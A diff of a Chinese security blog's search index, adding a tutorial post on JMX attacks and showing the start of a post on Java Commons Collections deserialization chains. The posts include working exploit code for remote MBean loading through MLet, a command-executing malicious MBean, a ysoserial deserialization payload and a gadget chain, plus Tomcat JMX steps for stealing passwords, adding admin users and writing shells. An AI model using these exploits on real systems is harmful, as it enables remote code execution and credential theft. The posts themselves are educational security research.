@@ -1,6 +1,296 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>JMX攻击</title>
+    <url>/2023/06/01/JMX/</url>
+    <content><![CDATA[<h1 id="JMX介绍"><a href="#JMX介绍" class="headerlink" title="JMX介绍"></a>JMX介绍</h1><p>JMX 全称为 Java Management Extensions，翻译过来就是 Java 管理扩展，用来管理和监测 Java 程序。最常用到的就是对于 JVM 的监测和管理，比如 JVM 内存、CPU 使用率、线程数、垃圾收集情况等等。</p>
+<p>用 Spring Boot 去理解，Spring Boot Actuator 它就用到了 JMX （Spring Boot &gt; 2.2.x 默认禁用 JMX Tomcat Bean 暴露）。JConsole 或者 VisualVM 它们也用到了 JMX。</p>
+<p><img src="/images/20230601171558.png"></p>
+<h2 id="MBean"><a href="#MBean" class="headerlink" title="MBean"></a>MBean</h2><p>JMX 是通过各种 MBean(Managed Bean) 传递消息的，MBean 其实就是我们经常说的 Java Bean，只不过由于它比较特殊，所以称之为 MBean。既然是个 Bean，里面就是一些属性和方法，外界就可以获取被管理的资源的状态和操纵MBean的行为。JMX 中共有四种类型的 MBean，分别是 Standard MBean, Dynamic MBean, Open MBean, Model MBean。JDK 提供的 MBean 主要在 java.lang.management 和 javax.management包里面。</p>
+<h2 id="MBeanServer"><a href="#MBeanServer" class="headerlink" title="MBeanServer"></a>MBeanServer</h2><p>MBeanServer 是负责管理 MBean 的，一般一个 JVM 只有一个 MBeanServer，所有的 MBean 都要注册到 MBeanServer 上，并通过 MBeanServer 对外提供服务。一般用 ManagementFactory.getPlatformMBeanServer()方法获取当前 JVM 内的 MBeanServer。</p>
+<h2 id="适配器和连接器"><a href="#适配器和连接器" class="headerlink" title="适配器和连接器"></a>适配器和连接器</h2><p>写好的 MBean 注册到 MBeanServer 上之后，功能已经具备了。<strong>适配器和连接器就是将这些功能开放出来的方式</strong> 。 比如 HTTP协议适配器，就是将功能以 HTTP 协议开放出去，这样我们就可以在浏览器使用了。</p>
+<p><strong>连接器是各种客户端最常用的，JDK 提供的默认连接器是 RMI 连接器，JConsole、VisualVM 都是使用它。</strong></p>
+<h1 id="基于RMI的JMX演示"><a href="#基于RMI的JMX演示" class="headerlink" title="基于RMI的JMX演示"></a>基于RMI的JMX演示</h1><pre><code>public class JMXDemo &#123;
+    public static void main(String[] args) throws Exception &#123;
+        MBeanServer mBeanServer = ManagementFactory.getPlatformMBeanServer();
+        ObjectName objectName = new ObjectName(&quot;test:type=HelloWorld&quot;);
+        Hello mbean = new Hello();
+        mBeanServer.registerMBean(mbean, objectName);
+
+        Registry registry = LocateRegistry.createRegistry(1199);
+        
+        JMXServiceURL jmxServiceURL = new JMXServiceURL(&quot;service:jmx:rmi:///jndi/rmi://127.0.0.1:1199/jmxrmi&quot;);
+        JMXConnectorServer jmxConnectorServer = JMXConnectorServerFactory.newJMXConnectorServer(jmxServiceURL, null, mBeanServer);
+        jmxConnectorServer.start();
+        System.out.println(&quot;Server start...&quot;);
+    &#125;
+&#125;
+</code></pre>
+<p>拆解：</p>
+<ul>
+<li>Probe Level</li>
+</ul>
+<p>实例化HelloMBean类为mbean</p>
+<blockquote>
+<p>standard MBean：它能管理的资源（包括属性，方法，时间）必须定义在接口中，实例化的MBean必须实现这个接口。它的命名也必须遵循一定的规范，例如我们的MBean为Hello，则接口必须为HelloMBean。<br>dynamic MBean：必须实现javax.management.DynamicMBean接口，所有的属性，方法都在运行时定义。</p>
+</blockquote>
+<p>代码：</p>
+<pre><code>ObjectName objectName = new ObjectName(&quot;test:type=Hello&quot;);
+Hello mbean = new Hello();
+</code></pre>
+<ul>
+<li>Agent Level</li>
+</ul>
+<p>创建了 MBeanServer 实例。<br>主要提供对资源的注册和管理。注册了mbean（具有唯一ObjectName）。</p>
+<pre><code>MBeanServer mBeanServer = ManagementFactory.getPlatformMBeanServer();
+mBeanServer.registerMBean(mbean, objectName);
+</code></pre>
+<ul>
+<li>Remote Management Level</li>
+</ul>
+<p>创建了JMXServiceURL，绑定到本地1199端口的RMI服务（基于RMI服务的），关联到MBeanServer。</p>
+<pre><code>Registry registry = LocateRegistry.createRegistry(1199);
+JMXServiceURL jmxServiceURL = new JMXServiceURL(&quot;service:jmx:rmi:///jndi/rmi://127.0.0.1:1199/jmxrmi&quot;);
+JMXConnectorServer jmxConnectorServer = JMXConnectorServerFactory.newJMXConnectorServer(jmxServiceURL, null, mBeanServer);
+jmxConnectorServer.start();
+</code></pre>
+<h2 id="使用jconsole图形工具监视、管理JMX"><a href="#使用jconsole图形工具监视、管理JMX" class="headerlink" title="使用jconsole图形工具监视、管理JMX"></a>使用jconsole图形工具监视、管理JMX</h2><p><code>jconsole</code>是基于JMX的可视化监视、管理工具，该工具是JDK的一部分<br>本地可以通过进程方式进行连接，远程可以通过<code>ip:port</code>方式进行连接。</p>
+<p>我们连接刚刚创建的rmi服务。</p>
+<p><img src="/images/20230601222529.png"></p>
+<p>可以用来获取&#x2F;设置bean属性，或调用方法。</p>
+<h1 id="攻击一：使用Melt加载远程MBean"><a href="#攻击一：使用Melt加载远程MBean" class="headerlink" title="攻击一：使用Melt加载远程MBean"></a>攻击一：使用Melt加载远程MBean</h1><h2 id="介绍MLet"><a href="#介绍MLet" class="headerlink" title="介绍MLet"></a>介绍MLet</h2><p>Mlet是一个类：<code>javax.management.loading.MLet</code>，这是一个mbean（实现接口<code>MLetMBean</code>）。该mbean存在一个方法<code>getMBeansFromURL</code>，可以从远程<code>mlet server</code>加载mbean。</p>
+<p><img src="/images/20230601224936.png"></p>
+<p>所以利用Melt攻击流程总结如下：</p>
+<ol>
+<li>MBeanServer中存在MLet的MBean</li>
+<li>利用MLet方法去加载我们恶意server中的Mlet文件</li>
+<li>Mlet文件中写入我们恶意jar包服务，被加载</li>
+<li>jar包中的恶意Mbean被加载进MBeanServer</li>
+<li>通过JMX调用恶意MBean的方法</li>
+</ol>
+<h2 id="攻击示例与分析"><a href="#攻击示例与分析" class="headerlink" title="攻击示例与分析"></a>攻击示例与分析</h2><p>创建恶意jar文件，用于命令执行</p>
+<p>EvilMBean.java:</p>
+<pre><code>public interface EvilMBean &#123;
+    String runCommand(String cmd);
+&#125;
+</code></pre>
+<p>Evil.java:</p>
+<pre><code>public class Evil implements EvilMBean&#123;
+    @Override
+    public String runCommand(String cmd) &#123;
+        try &#123;
+            Runtime rt = Runtime.getRuntime();
+            Process proc = rt.exec(cmd);
+            BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));
+            BufferedReader stdError = new BufferedReader(new InputStreamReader(proc.getErrorStream()));
+            String stdout_err_data = &quot;&quot;;
+            String s;
+            while ((s = stdInput.readLine()) != null)
+            &#123;
+                stdout_err_data += s+&quot;\n&quot;;
+            &#125;
+            while ((s = stdError.readLine()) != null)
+            &#123;
+                stdout_err_data += s+&quot;\n&quot;;
+            &#125;
+            proc.waitFor();
+            return stdout_err_data;
+        &#125;
+        catch (Exception e)
+        &#123;
+            return e.toString();
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<p>创建MLet文件，用于指向我们恶意jar包服务</p>
+<p><code>mlet.txt</code>:</p>
+<pre><code>&lt;html&gt;&lt;mlet code=&quot;Evil&quot; archive=&quot;Evil.jar&quot; name=&quot;MLetCompromise:name=evil,id=1&quot; codebase=&quot;http://127.0.0.1:8000&quot;&gt;&lt;/mlet&gt;&lt;/html&gt;
+</code></pre>
+<p><code>Evil&quot;</code>为恶意mbean的路径；</p>
+<p><code>archive=&quot;Evil.jar&quot;</code>为恶意mbean的jar包；</p>
+<p><code>name=&quot;MLetCompromise:name=evil,id=1&quot;</code>可自定义，遵循OBjectname规则；</p>
+<p><code>codebase=&quot;http://127.0.0.1:8000&quot;</code>访问为jar包的url。</p>
+<p>将Evil.jar和mlet.txt放在同一目录，<code>python3 -m http.server 8000</code>启动web服务。</p>
+<p>受害者MBeanServer：</p>
+<pre><code>public class MeltJMXDemo &#123;
+    public static void main(String[] args) throws Exception &#123;
+        MBeanServer mBeanServer = ManagementFactory.getPlatformMBeanServer();
+        MLet mLet = new MLet();
+        ObjectName objectNameMLet = new ObjectName(&quot;JMXMLet:type=MLet&quot;);
+        mBeanServer.registerMBean(mLet, objectNameMLet);
+
+        Registry registry = LocateRegistry.createRegistry(1199);
+
+        JMXServiceURL jmxServiceURL = new JMXServiceURL(&quot;service:jmx:rmi:///jndi/rmi://127.0.0.1:1199/jmxrmi&quot;);
+        JMXConnectorServer jmxConnectorServer = JMXConnectorServerFactory.newJMXConnectorServer(jmxServiceURL, null, mBeanServer);
+        jmxConnectorServer.start();
+        System.out.println(&quot;MeltJMXServer start...&quot;);
+    &#125;
+&#125;
+</code></pre>
+<p>通过jconsole攻击：</p>
+<p>本地起一个server，目录下包含我们的恶意melt文件和jar包</p>
+<p><img src="/images/20230601232259.png"></p>
+<p>通过jconsole调用Melt的<code>getMBeansFromURL</code>方法，参数中填入我们的恶意server地址</p>
+<p><img src="/images/20230601232833.png"></p>
+<p>我们的恶意MBean被成功加载，通过恶意MBean命令执行</p>
+<p><img src="/images/20230601232958.png"></p>
+<h1 id="攻击二：远程加载MBean"><a href="#攻击二：远程加载MBean" class="headerlink" title="攻击二：远程加载MBean"></a>攻击二：远程加载MBean</h1><p>JMX Server可以在本地绑定MBean，同时也可以加载远程MBean，并且这一过程我们可以在客户端控制。</p>
+<h2 id="攻击示例"><a href="#攻击示例" class="headerlink" title="攻击示例"></a>攻击示例</h2><p>随便起一个JMXServer，里面随便绑定了个MBean，并没有绑定MLet</p>
+<pre><code>public class JMXDemo &#123;
+    public static void main(String[] args) throws Exception &#123;
+        MBeanServer mBeanServer = ManagementFactory.getPlatformMBeanServer();
+        ObjectName objectName = new ObjectName(&quot;test:type=Hello&quot;);
+        Hello mbean = new Hello();
+        mBeanServer.registerMBean(mbean, objectName);
+
+        Registry registry = LocateRegistry.createRegistry(1199);
+
+        JMXServiceURL jmxServiceURL = new JMXServiceURL(&quot;service:jmx:rmi:///jndi/rmi://127.0.0.1:1199/jmxrmi&quot;);
+        JMXConnectorServer jmxConnectorServer = JMXConnectorServerFactory.newJMXConnectorServer(jmxServiceURL, null, mBeanServer);
+        jmxConnectorServer.start();
+        System.out.println(&quot;Server start...&quot;);
+    &#125;
+&#125;
+</code></pre>
+<p>通过远程加载MLet，再去加载我们的恶意server中的MBean</p>
+<pre><code>public class ExploitJMXByRemoteMBean &#123;
+    public static void main(String[] args) throws MalformedURLException &#123;
+        connectAndOwn(&quot;127.0.0.1&quot;, &quot;1199&quot;, &quot;ipconfig&quot;);
+    &#125;
+
+    static void connectAndOwn(String serverName, String port, String command) throws MalformedURLException &#123;
+        try &#123;
+            // step1. 通过rmi创建 jmx连接
+            JMXServiceURL u = new JMXServiceURL(&quot;service:jmx:rmi:///jndi/rmi://&quot; + serverName + &quot;:&quot; + port + &quot;/jmxrmi&quot;);
+            System.out.println(&quot;URL: &quot; + u + &quot;, connecting&quot;);
+            JMXConnector c = JMXConnectorFactory.connect(u);
+            System.out.println(&quot;Connected: &quot; + c.getConnectionId());
+            MBeanServerConnection m = c.getMBeanServerConnection();
+            // step2. 加载特殊MBean：javax.management.loading.MLet
+            ObjectInstance evil_bean = null;
+            ObjectInstance evil = null;
+            try &#123;
+                evil = m.createMBean(&quot;javax.management.loading.MLet&quot;, null);
+            &#125; catch (javax.management.InstanceAlreadyExistsException e) &#123;
+                evil = m.getObjectInstance(new ObjectName(&quot;DefaultDomain:type=MLet&quot;));
+            &#125;
+            // step3：通过MLet加载远程恶意MBean
+            System.out.println(&quot;Loaded &quot;+evil.getClassName());
+            Object res = m.invoke(evil.getObjectName(), &quot;getMBeansFromURL&quot;, new Object[]
+                            &#123; &quot;http://127.0.0.1:8000/mlet.txt&quot; &#125;,
+                    new String[] &#123; String.class.getName() &#125; );
+            HashSet res_set = ((HashSet)res);
+            Iterator itr = res_set.iterator();
+            Object nextObject = itr.next();
+            // 如果恶意mbean已经存在，则直接获取
+            if (nextObject instanceof InstanceAlreadyExistsException)
+            &#123;
+                //
+                evil_bean = m.getObjectInstance(new ObjectName(&quot;MLetCompromise:name=evil,id=1&quot;));
+            &#125; else if (nextObject instanceof Exception) &#123;
+                throw ((Exception)nextObject);
+            &#125; else &#123;
+                evil_bean = ((ObjectInstance)nextObject);
+            &#125;
+            // step4: 执行恶意MBean
+            System.out.println(&quot;Loaded class: &quot;+evil_bean.getClassName()+&quot; object &quot;+evil_bean.getObjectName());
+            System.out.println(&quot;Calling runCommand with: &quot;+command);
+            Object result = m.invoke(evil_bean.getObjectName(), &quot;runCommand&quot;, new Object[]&#123; command &#125;, new String[]&#123; String.class.getName() &#125;);
+            System.out.println(&quot;Result: &quot;+result);
+        &#125; catch (Exception e)
+        &#123;
+            e.printStackTrace();
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<p>恶意MBean被加载，成功命令执行</p>
+<p><img src="/images/20230601233920.png"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>该攻击需要两个条件：</p>
+<ol>
+<li>未启用JMX身份验证</li>
+<li>可以调用 <code>getMBeansFromURL</code></li>
+</ol>
+<p>需要设置<code>jmx.remote.x.mlet.allow.getMBeansFromURL=true</code></p>
+<pre><code>MBeanServerAccessController：
+
+final String propName =&quot;jmx.remote.x.mlet.allow.getMBeansFromURL&quot;;
+GetPropertyAction propAction = new GetPropertyAction(propName);
+String propValue = AccessController.doPrivileged(propAction);
+boolean allowGetMBeansFromURL =&quot;true&quot;.equalsIgnoreCase(propValue);
+if (!allowGetMBeansFromURL) &#123;
+    throw new SecurityException(&quot;Access denied! MLet method &quot; +
+            &quot;getMBeansFromURLcannot be invoked unless a &quot; +
+            &quot;security manageris installed or the system property &quot; +
+            &quot;-Djmx.remote.x.mlet.allow.getMBeansFromURL=true&quot; +
+            &quot;isspecified.&quot;);
+&#125;
+</code></pre>
+<h1 id="攻击三：通过MBean方法参数反序列化攻击JMX"><a href="#攻击三：通过MBean方法参数反序列化攻击JMX" class="headerlink" title="攻击三：通过MBean方法参数反序列化攻击JMX"></a>攻击三：通过MBean方法参数反序列化攻击JMX</h1><h2 id="JMX调用MBean的流程"><a href="#JMX调用MBean的流程" class="headerlink" title="JMX调用MBean的流程"></a>JMX调用MBean的流程</h2><ol>
+<li>将<code>MBean name</code>、<code>MBean Function Name</code>、<code>params</code>发送给远程<code>rmi server</code>，其中<code>params</code>的处理需要注意下，先转为<code>MarshalledObject</code>，再<code>writeObject</code>为<code>String</code>对象，然后进入网络传输；</li>
+<li><code>RMI Server</code>监听到网络请求包含<code>MBean name</code>、<code>MBean Function Name</code>、<code>params</code>，其中params经过<code>MarshalledObject.readObject()</code>反序列化，再通过<code>invoke</code>调用原函数。</li>
+</ol>
+<h2 id="攻击示例-1"><a href="#攻击示例-1" class="headerlink" title="攻击示例"></a>攻击示例</h2><p>使用<code>CommonsCollections2</code>链，参考<code>ysoserial.exploit.JMXInvokeMBean</code></p>
+<pre><code>public class AttackMBeanParams &#123;
+
+    public static void main(String[] args) throws Exception &#123;
+
+        JMXServiceURL url = new JMXServiceURL(&quot;service:jmx:rmi:///jndi/rmi://127.0.0.1:1199/jmxrmi&quot;);
+
+        JMXConnector jmxConnector = JMXConnectorFactory.connect(url);
+        MBeanServerConnection mbeanServerConnection = jmxConnector.getMBeanServerConnection();
+
+        // create the payload
+        Object payloadObject = ObjectPayload.Utils.makePayloadObject(&quot;CommonsCollections2&quot;, &quot;calc&quot;);
+        ObjectName mbeanName = new ObjectName(&quot;java.util.logging:type=Logging&quot;);
+
+        mbeanServerConnection.invoke(mbeanName, &quot;getLoggerLevel&quot;, new Object[]&#123;payloadObject&#125;, new String[]&#123;String.class.getCanonicalName()&#125;);
+
+        //close the connection
+        jmxConnector.close();
+    &#125;
+&#125;
+</code></pre>
+<p><img src="/images/20230602000002.png"></p>
+<h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>ysoserial用的<code>java.util.logging:type=Logging</code>，换其他ObjectName也行</p>
+<p><img src="/images/20230602000218.png"></p>
+<h1 id="攻击四：利用中间件等的特殊MBean攻击JMX"><a href="#攻击四：利用中间件等的特殊MBean攻击JMX" class="headerlink" title="攻击四：利用中间件等的特殊MBean攻击JMX"></a>攻击四：利用中间件等的特殊MBean攻击JMX</h1><h2 id="通过JMX攻击Tomcat"><a href="#通过JMX攻击Tomcat" class="headerlink" title="通过JMX攻击Tomcat"></a>通过JMX攻击Tomcat</h2><p>Tomcat中默认不开启JMX服务，需要在catalina.bat中配置启动参数</p>
+<pre><code>set &quot;CATALINA_OPTS=%CATALINA_OPTS% -Dcom.sun.management.jmxremote -DJava.rmi.server.hostname=0.0.0.0 -Dcom.sun.management.jmxremote.port=9999 -Dcom.sun.management.jmxremote.ssl=false -Dcom.sun.management.jmxremote.authenticate=false&quot;
+rem   CATALINA_OPTS   (Optional) Java runtime options used when the &quot;start&quot;,
+rem                   &quot;run&quot; or &quot;debug&quot; command is executed.
+rem                   Include here and not in JAVA_OPTS all options, that should
+rem                   only be used by Tomcat itself, not by the stop process,
+rem                   the version command etc.
+</code></pre>
+<p>在9999端口启动一个无认证的JMX服务。</p>
+<p>使用jconsole连接到本地tomcat启动的JMX服务。</p>
+<h3 id="获取已有用户的密码"><a href="#获取已有用户的密码" class="headerlink" title="获取已有用户的密码"></a>获取已有用户的密码</h3><p><code>User</code>-&gt;<code>&quot;tomcatAdmin&quot;</code>-&gt;<code>UserDatabase</code></p>
+<h3 id="添加管理员角色用户"><a href="#添加管理员角色用户" class="headerlink" title="添加管理员角色用户"></a>添加管理员角色用户</h3><ol>
+<li><p><code>Users</code>-&gt;<code>UserDatabase</code>，<code>createUser</code>：</p>
+</li>
+<li><p><code>Users</code>-&gt;<code>UserDatabase</code>，创建角色</p>
+</li>
+<li><p><code>Users</code>-&gt;<code>User</code>-&gt;<code>[用户名]</code>节点下，将创建的用户与创建的角色关联</p>
+</li>
+<li><p>保存配置</p>
+</li>
+</ol>
+<h3 id="日志循环函数导致写shell"><a href="#日志循环函数导致写shell" class="headerlink" title="日志循环函数导致写shell"></a>日志循环函数导致写shell</h3><p>Catalina-&gt;Valve-&gt;localhost-&gt;AccessLogValve-&gt;Operations</p>
+<p>boolean rotate(string newFileName)</p>
+<h3 id="抓取网络应用的用户的session-ID"><a href="#抓取网络应用的用户的session-ID" class="headerlink" title="抓取网络应用的用户的session ID"></a>抓取网络应用的用户的session ID</h3><p>Catalina-&gt;Manager-&gt;[ApplicationName]-&gt;Operations-&gt;listSessionIds()</p>
+<h1 id="攻击五：RMI攻击"><a href="#攻击五：RMI攻击" class="headerlink" title="攻击五：RMI攻击"></a>攻击五：RMI攻击</h1><p>因为JMXServer是绑定RMi服务的，所以攻击RMI服务的方式都可以用来攻击JMXServer，这里不再赘述，可以去看RMI攻击的文章</p>
+]]></content>
+      <categories>
+        <category>java安全</category>
+      </categories>
+      <tags>
+        <tag>java安全</tag>
+        <tag>JMX</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>JNDI注入原理分析</title>
     <url>/2023/04/15/JNDI-Injection/</url>
     <content><![CDATA[<h1 id="JNDI简介"><a href="#JNDI简介" class="headerlink" title="JNDI简介"></a>JNDI简介</h1><p>官方：JNDI(Java Naming and Directory Interface)是一个应用程序设计的 API，一种标准的 Java 命名系统接口。JNDI 提供统一的客户端 API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将 JNDI API 映射为特定的命名服务和目录系统，使得 Java 应用程序可以和这些命名服务和目录服务之间进行交互。</p>
@@ -636,293 +926,692 @@ ref.add(new StringRefAddr(&quot;x&quot;, &quot;&#39;calc&#39;.execute()&quot;));
       </tags>
   </entry>
   <entry>
-    <title>JMX攻击</title>
-    <url>/2023/06/01/JMX/</url>
-    <content><![CDATA[<h1 id="JMX介绍"><a href="#JMX介绍" class="headerlink" title="JMX介绍"></a>JMX介绍</h1><p>JMX 全称为 Java Management Extensions，翻译过来就是 Java 管理扩展，用来管理和监测 Java 程序。最常用到的就是对于 JVM 的监测和管理，比如 JVM 内存、CPU 使用率、线程数、垃圾收集情况等等。</p>
-<p>用 Spring Boot 去理解，Spring Boot Actuator 它就用到了 JMX （Spring Boot &gt; 2.2.x 默认禁用 JMX Tomcat Bean 暴露）。JConsole 或者 VisualVM 它们也用到了 JMX。</p>
-<p><img src="/images/20230601171558.png"></p>
-<h2 id="MBean"><a href="#MBean" class="headerlink" title="MBean"></a>MBean</h2><p>JMX 是通过各种 MBean(Managed Bean) 传递消息的，MBean 其实就是我们经常说的 Java Bean，只不过由于它比较特殊，所以称之为 MBean。既然是个 Bean，里面就是一些属性和方法，外界就可以获取被管理的资源的状态和操纵MBean的行为。JMX 中共有四种类型的 MBean，分别是 Standard MBean, Dynamic MBean, Open MBean, Model MBean。JDK 提供的 MBean 主要在 java.lang.management 和 javax.management包里面。</p>
-<h2 id="MBeanServer"><a href="#MBeanServer" class="headerlink" title="MBeanServer"></a>MBeanServer</h2><p>MBeanServer 是负责管理 MBean 的，一般一个 JVM 只有一个 MBeanServer，所有的 MBean 都要注册到 MBeanServer 上，并通过 MBeanServer 对外提供服务。一般用 ManagementFactory.getPlatformMBeanServer()方法获取当前 JVM 内的 MBeanServer。</p>
-<h2 id="适配器和连接器"><a href="#适配器和连接器" class="headerlink" title="适配器和连接器"></a>适配器和连接器</h2><p>写好的 MBean 注册到 MBeanServer 上之后，功能已经具备了。<strong>适配器和连接器就是将这些功能开放出来的方式</strong> 。 比如 HTTP协议适配器，就是将功能以 HTTP 协议开放出去，这样我们就可以在浏览器使用了。</p>
-<p><strong>连接器是各种客户端最常用的，JDK 提供的默认连接器是 RMI 连接器，JConsole、VisualVM 都是使用它。</strong></p>
-<h1 id="基于RMI的JMX演示"><a href="#基于RMI的JMX演示" class="headerlink" title="基于RMI的JMX演示"></a>基于RMI的JMX演示</h1><pre><code>public class JMXDemo &#123;
-    public static void main(String[] args) throws Exception &#123;
-        MBeanServer mBeanServer = ManagementFactory.getPlatformMBeanServer();
-        ObjectName objectName = new ObjectName(&quot;test:type=HelloWorld&quot;);
-        Hello mbean = new Hello();
-        mBeanServer.registerMBean(mbean, objectName);
+    <title>Java反序列化——CC链</title>
+    <url>/2023/03/15/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94CC%E9%93%BE/</url>
+    <content><![CDATA[<h1 id="CommonsCollections1"><a href="#CommonsCollections1" class="headerlink" title="CommonsCollections1"></a>CommonsCollections1</h1><h2 id="maven依赖版本"><a href="#maven依赖版本" class="headerlink" title="maven依赖版本"></a>maven依赖版本</h2><pre><code>&lt;dependency&gt;
+    &lt;groupId&gt;commons-collections&lt;/groupId&gt;
+    &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;
+    &lt;version&gt;3.1&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="AbstractMapDecorator"><a href="#AbstractMapDecorator" class="headerlink" title="AbstractMapDecorator"></a>AbstractMapDecorator</h3><p>CC 库中提供了一个抽象类 <code>org.apache.commons.collections.map.AbstractMapDecorator</code>，这个类是 Map 的扩展，并且从名字中可以知道，这是一个基础的装饰器，用来给 map 提供附加功能，被装饰的 map 存在该类的属性中，并且将所有的操作都转发给这个 map。</p>
+<p>这个类有很多实现类，各个类触发的方式不同，重点关注的是 </p>
+<ul>
+<li>TransformedMap </li>
+<li>LazyMap。</li>
+</ul>
+<h4 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h4><p><code>org.apache.commons.collections.map.TransformedMap</code> 类可以在一个元素被加入到集合内时，自动对该元素进行特定的修饰变换，具体的变换逻辑由 Transformer 来定义，Transformer 在 TransformedMap 实例化时作为参数传入。</p>
+<p><img src="/images/20230425195602.png"></p>
+<p>TransformedMap 内的 key 或者 value 发生变化时，例如调用 TransformedMap 的 <code>put</code> 方法时，就会<code>put</code>方法内会调用，<code>transformKey</code>和<code>transformValue</code>， 而这两个方法内就会调用keyTransformer的 <code>transform()</code> 方法。</p>
+<h4 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h4><p><code>org.apache.commons.collections.map.LazyMap</code> 与 TransformedMap 类似，不过差异是调用 <code>get()</code> 方法时如果传入的 key 不存在，则会触发相应参数的 Transformer 的 <code>transform()</code> 方法。</p>
+<p>与 LazyMap 具有相同功能的，是 <code>org.apache.commons.collections.map.DefaultedMap</code>，同样是 <code>get()</code> 方法会触发 transform 方法。</p>
+<h3 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h3><p><code>org.apache.commons.collections.Transformer</code> 是一个接口，提供了一个 <code>transform()</code> 方法，用来定义具体的转换逻辑。例如<code>InvokerTransformer</code>方法接收 Object 类型的 input，处理后将 Object 返回。</p>
+<p><img src="/images/20230425200030.png"></p>
+<p>在 Commons Collection 3.2.1 中，程序提供了 14 个 Transformer 的实现类，用来实现不同的对 TransformedMap 中 key&#x2F;value 进行修改的功能。</p>
+<h4 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h4><p>这个实现类从 Commons Collections 3.0 引入，功能是使用反射创建一个新对象，我们来看一下它的 transfrom 方法，方法注释写的很清楚，通过调用 input 的方法，并将方法返回结果作为处理结果进行返回。</p>
+<p><img src="/images/20230425200155.png"></p>
+<h4 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h4><p><code>org.apache.commons.collections.functors.ChainedTransformer</code> 类也是一个 Transformer的实现类，但是这个类自己维护了一个 Transformer 数组， 在调用 ChainedTransformer 的 transform 方法时，会循环数组，依次调用 Transformer 数组中每个 Transformer 的 transform 方法，并将结果传递给下一个 Transformer。</p>
+<p><img src="/images/20230425200719.png"></p>
+<p>这样就给了使用者链式调用多个 Transformer 分别处理对象的能力。</p>
+<h4 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h4><p><code>org.apache.commons.collections.functors.ConstantTransformer</code> 是一个返回固定常量的 Transformer，在初始化时储存了一个 Object，后续的调用时会直接返回这个 Object。</p>
+<pre><code>public Object transform(Object input) &#123;
+    return iConstant;
+&#125;
+</code></pre>
+<p>这个类用于和 ChainedTransformer 配合，ChainedTransformer需要传入Transformer类型的数组来链式调用，当我们需要一个Class类时，就需要把Class类包装成ConstantTransformer对象，传入Transformer数组，然后将其结果传入 InvokerTransformer 来调用我们指定的类的指定方法。</p>
+<h2 id="构造Gadget"><a href="#构造Gadget" class="headerlink" title="构造Gadget"></a>构造Gadget</h2><p>以要执行Runtime.getRuntime().exec(“calc”)为例,对应的Sink和chain实例代码就是：</p>
+<pre><code>Map hashMap = new HashMap();
 
-        Registry registry = LocateRegistry.createRegistry(1199);
-        
-        JMXServiceURL jmxServiceURL = new JMXServiceURL(&quot;service:jmx:rmi:///jndi/rmi://127.0.0.1:1199/jmxrmi&quot;);
-        JMXConnectorServer jmxConnectorServer = JMXConnectorServerFactory.newJMXConnectorServer(jmxServiceURL, null, mBeanServer);
-        jmxConnectorServer.start();
-        System.out.println(&quot;Server start...&quot;);
+ChainedTransformer chain = new ChainedTransformer(new Transformer[]&#123;
+        new ConstantTransformer(Runtime.class),
+        new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),
+        new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),
+        new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)
+&#125;);
+
+Map transformedMap = TransformedMap.decorate(hashMap, null, chain);
+
+hashMap.put(&quot;test&quot;, &quot;test&quot;);
+</code></pre>
+<p>chain链执行流程：</p>
+<pre><code>new ConstantTransformer(Runtime.class)
+</code></pre>
+<p>返回Runtime 的 Class 对象，传入到InvokerTransformer对象的transform方法中,相当于<code>InvokerTransformer.transform(Runtime.class)</code></p>
+<pre><code>new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;)
+</code></pre>
+<p>调用Runtime.getMethod去查找getRuntime方法，返回了<code>Runtime.getRuntime</code>这个方法（Method类型）</p>
+<pre><code>new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;)
+</code></pre>
+<p>调用<code>Runtime.getRuntime</code>（Method类型）的<code>invoke</code>方法，返回了<code>Runtime.getMethod()</code>Runtime对象</p>
+<pre><code>new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)
+</code></pre>
+<p>调用Runtime对象的<code>exec</code>方法，去执行calc</p>
+<p>然后使用decorate 方法将 ChainedTransformer 设置为 map 的装饰器处理方法后，当调用 TransformedMap 的 put&#x2F;setValue 等方法时会触发 Transformer 链的调用处理。</p>
+<p>截止到这里，我们利用 CC 库成功构造了 sink gadget 和 chain gadget，接下来我们需要找到一个 kick-off gadget：一个类重写了 readObject ，在反序列化时可以改变 map 的值。</p>
+<p><code>sun.reflect.annotation.AnnotationInvocationHandler</code>恰好满足我们的要求，这个类实现了 InvocationHandler 接口，原本是用于 JDK 对于注解形式的动态代理。</p>
+<p><img src="/images/20230425203156.png"></p>
